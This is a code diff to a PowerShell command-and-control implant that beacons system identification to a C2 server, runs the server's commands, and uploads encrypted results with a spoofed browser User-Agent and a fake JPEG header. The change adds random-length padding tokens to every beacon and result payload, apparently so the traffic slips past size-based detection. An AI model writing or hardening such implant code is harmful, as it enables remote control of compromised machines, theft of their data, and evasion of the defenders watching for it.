@@ -173,6 +173,19 @@ function Get-SystemIdentification {
     return $jsonInfo
 }
 
+# Function to generate random padding data for token field
+function Get-RandomToken {
+    # Generate a totally random length between 50 and 500
+    # Using Get-Random without the -SetSeed parameter for true randomness
+    $rand = Get-Random -Minimum 50 -Maximum 500
+    
+    # Generate random alphanumeric string
+    $chars = (65..90) + (97..122) + (48..57)  # A-Z, a-z, 0-9
+    $padding = -join ((65..90)*2 + (97..122)*2 + (48..57)*1 | Get-Random -Count $rand | ForEach-Object {[char]$_})
+    
+    return $padding
+}
+
 # Function to process commands from the C2 server
 function Process-Commands {
     param([array]$Commands)
@@ -234,6 +247,7 @@ function Process-Commands {
                             $encryptedResult = Encrypt-Data -PlainText $resultJson
                             $encryptedObj = @{
                                 data = $encryptedResult
+                                token = Get-RandomToken  # Add random token
                             }
                             $encryptedJson = ConvertTo-Json -InputObject $encryptedObj -Compress
                             $resultClient.UploadString($resultUrl, $encryptedJson)
@@ -309,8 +323,10 @@ function Process-Commands {
             $resultClient.Headers.Add("Content-Type", "application/json")
             
             # Create payload with encrypted data (JPEG header is now added inside Encrypt-Data)
+            # Include random token field in the response
             $payload = @{
                 data = $encryptedResult
+                token = Get-RandomToken  # Add random token
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
@@ -343,9 +359,10 @@ function Process-Commands {
             $resultClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
             $resultClient.Headers.Add("Content-Type", "application/json")
             
-            # Create payload with encrypted data
+            # Create payload with encrypted data and random token
             $payload = @{
                 data = $encryptedResult
+                token = Get-RandomToken
             }
             $payloadJson = ConvertTo-Json -InputObject $payload -Compress
             
@@ -452,18 +469,23 @@ function Start-AgentLoop {
             # Prepare the system info data
             $systemInfoRaw = Get-SystemIdentification
             
+            # Generate random token for this request
+            $randomToken = Get-RandomToken
+            
             # Create beacon payload with different format based on encryption status
             if ($global:firstContact) {
                 # First contact - simpler payload
                 $beaconPayload = @{
                     data = $systemInfoRaw
                     first_contact = $true
+                    token = $randomToken  # Add random token
                 }
             } else {
                 # Established contact - encrypt data and don't include client ID
                 $encryptedSystemInfo = Encrypt-Data -PlainText $systemInfoRaw
                 $beaconPayload = @{
                     data = $encryptedSystemInfo
+                    token = $randomToken  # Add random token
                 }
                 
                 # Include rotation ID only if path rotation is enabled
